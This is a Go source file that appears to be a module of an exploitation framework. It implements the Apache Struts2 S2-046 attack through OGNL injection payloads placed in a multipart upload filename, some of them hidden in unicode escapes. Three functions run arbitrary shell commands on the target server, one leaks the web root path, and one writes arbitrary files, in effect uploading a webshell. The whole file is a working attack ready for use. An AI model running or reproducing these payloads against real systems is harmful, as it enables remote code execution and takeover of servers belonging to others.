package exp_Struts2

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_046 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_046) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 构造payload
	headers := self.GetInitExpHeaders()

	randomStr := goutils.RandStr(8)
	random32Str := goutils.RandStr(32)
	random32Str = strings.ToLower(random32Str)
	shellPayload := "s\x00" + `%{\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0072\u0065\u0071\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0027\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u003d\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006c\u0069\u0073\u0074\u003d\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u002e\u0073\u0074\u0061\u0072\u0074\u0073\u0057\u0069\u0074\u0068\u0028\u0027\u0057\u0069\u006e\u0064\u006f\u0077\u0073\u0027\u0029\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u0029\u002e\u0028\u0023\u0061\u0061\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u006c\u0069\u0073\u0074\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0062\u0062\u003d\u0023\u0061\u0061\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u006e\u0065\u0077\u0020\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0028\u0029\u002e\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u0028\u0023\u0062\u0062\u0029\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0065\u006e\u0063\u006f\u0064\u0065\u0029\u0029\u003f\u0074\u0072\u0075\u0065\u003a\u0074\u0072\u0075\u0065\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029\u0029}`
	data := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"test\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n", random32Str, shellPayload, randomStr, random32Str)

	cmd = strings.ReplaceAll(cmd, " ", "+")
	cmd = url.PathEscape(cmd)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + fmt.Sprintf("?&&encode=%s&cmd=%s", self.Params.Settings.Charset, cmd)

	headers["Content-Type"] = []string{"multipart/form-data; boundary=" + random32Str}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_046) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 构造payload
	headers := self.GetInitExpHeaders()

	randomStr := goutils.RandStr(8)
	random32Str := goutils.RandStr(32)
	random32Str = strings.ToLower(random32Str)
	shellPayload := `%{\u0028\u0023\u006e\u0069\u006b\u0065\u003d\u0027multipart/form-data\u0027\u0029\u002e\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u003d\u0027lz520520\u0027\u0029\u002e\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003d\u0028\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0027\u0077\u0069\u006e\u0027\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u0073\u003d\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u0029\u0029\u002e\u0028\u0023\u0070\u003d\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0028\u0023\u0070\u002e\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074\u0045\u0072\u0072\u006f\u0072\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0074\u0072\u0075\u0065\u0029\u0029\u002e\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u003d\u0023\u0070\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u003d\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0073\u0074\u0072\u0075\u0074\u0073\u0032\u002e\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u0029\u002e\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0040\u0063\u006f\u0070\u0079\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0023\u0072\u006f\u0073\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029}` + "\x00b"
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	data := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"test\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n", random32Str, shellPayload, randomStr, random32Str)

	headers["Content-Type"] = []string{"multipart/form-data; boundary=" + random32Str}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_046) Attack_cmd3() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 构造payload
	headers := self.GetInitExpHeaders()

	randomStr := goutils.RandStr(8)
	random32Str := goutils.RandStr(32)
	random32Str = strings.ToLower(random32Str)
	shellPayload := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='lz520520').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	data := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"test\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n", random32Str, shellPayload, randomStr, random32Str)

	headers["Content-Type"] = []string{"multipart/form-data; boundary=" + random32Str}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_046) Attack_getmsg3() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	randomStr := goutils.RandStr(8)
	random32Str := goutils.RandStr(32)
	random32Str = strings.ToLower(random32Str)
	shellPayload := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}\x00b"
	data := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"test\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n", random32Str, shellPayload, randomStr, random32Str)

	headers["Content-Type"] = []string{"multipart/form-data; boundary=" + random32Str}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_046) Attack_upload3() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 构造payload
	headers := self.GetInitExpHeaders()

	randomStr := goutils.RandStr(8)
	random32Str := goutils.RandStr(32)
	random32Str = strings.ToLower(random32Str)
	shellPayload := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#resp=@org.apache.struts2.ServletActionContext@getResponse()).(#content=#req.getParameter('content')).(#content=new java.lang.String(#content)).(#path=#req.getSession().getServletContext().getRealPath('/')).(#file=new java.io.File(#parameters['filename'][0])).(#fos=new java.io.FileOutputStream(#file)).(#fos.write(#content.getBytes())).(#fos.flush()).(#fos.close()).(#resp.getWriter().println(11282383-1)).(#resp.getWriter().flush()).(#resp.getWriter().close())}\x00b"
	data := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"test\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n", random32Str, shellPayload, randomStr, random32Str)

	headers["Content-Type"] = []string{"multipart/form-data; boundary=" + random32Str}
	target := fmt.Sprintf("%s?content=%s&filename=%s", strings.TrimRight(self.Params.BaseParam.Target, "?"), url.QueryEscape(content), url.QueryEscape(filename))
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		return
	}

	result := httpresp.Body
	if len(result) > 20 {
		result = result[:20]
	}
	if strings.Contains(result, "11282382") {
		expResult.Status = true
		self.EchoSuccessMsg("shell: %s", httpresp.Body)
	}
	return
}

// func
func init() {

	exp_register.ExpStructRegister(&Exp_S2_046{}, "exp_S2_046.yml")

}
